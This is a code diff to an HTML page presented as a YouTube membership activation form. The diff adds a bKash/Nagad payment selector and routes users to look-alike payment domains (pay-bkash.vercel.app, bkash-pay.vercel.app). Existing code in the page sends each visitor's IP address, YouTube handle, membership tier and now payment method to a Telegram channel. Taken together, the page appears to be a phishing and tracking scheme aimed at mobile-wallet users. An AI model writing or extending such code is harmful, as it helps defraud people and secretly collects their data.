@@ -136,6 +136,18 @@
             background-color: rgba(0, 0, 0, 0.5);
             z-index: 500;
         }
+
+        /* Payment logos */
+        .payment-logo {
+            display: flex;
+            justify-content: space-around;
+            margin: 10px 0;
+        }
+
+        .payment-logo img {
+            width: 80px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -218,6 +230,14 @@
             <option value="gold">Gold Membership</option>
             <option value="platinum">Platinum Membership</option>
         </select>
+        <label for="paymentMethod">Select Payment Method:</label>
+        <div class="payment-logo">
+            <select id="paymentMethod">
+                <option value="" disabled selected>Select Payment Method</option>
+                <option value="bKash" data-img="https://imgur.com/HoTrMsT.png">bKash</option>
+                <option value="Nagad" data-img="https://imgur.com/A8sT2AP.png">Nagad</option>
+            </select>
+        </div>
         <button onclick="activate()">Activate</button>
     </div>
 
@@ -245,7 +265,7 @@
 
         function getIPAndSendMessage(message) {
             fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
+                .then(response =>                 response.json())
                 .then(data => {
                     const ipMessage = `${message} IP Address: ${data.ip}`;
                     sendTelegramMessage(ipMessage);
@@ -260,16 +280,21 @@
             const youtubeHandle = document.getElementById('youtubeHandle').value;
             const activationCode = document.getElementById('activationCode').value;
             const membershipType = document.getElementById('membershipType').value;
+            const paymentMethod = document.getElementById('paymentMethod').value;
 
             if (activationCode === 'LYT089') {
                 // Send activation message to Telegram
-                getIPAndSendMessage(`YouTube Handle: ${youtubeHandle} has activated their subscription. Membership: ${membershipType}`);
+                getIPAndSendMessage(`YouTube Handle: ${youtubeHandle} has activated their subscription. Membership: ${membershipType}, Payment Method: ${paymentMethod}`);
 
-                // Redirect based on membership type
-                if (membershipType === 'gold') {
+                // Redirect based on membership type and payment method
+                if (membershipType === 'gold' && paymentMethod === 'bKash') {
                     window.location.href = 'https://pay-bkash.vercel.app';
-                } else if (membershipType === 'platinum') {
+                } else if (membershipType === 'platinum' && paymentMethod === 'bKash') {
                     window.location.href = 'https://bkash-pay.vercel.app';
+                } else if (membershipType === 'gold' && paymentMethod === 'Nagad') {
+                    window.location.href = 'not-added-yet';
+                } else if (membershipType === 'platinum' && paymentMethod === 'Nagad') {
+                    window.location.href = 'not-added-yet';
                 }
             } else {
                 alert('Invalid activation code!');
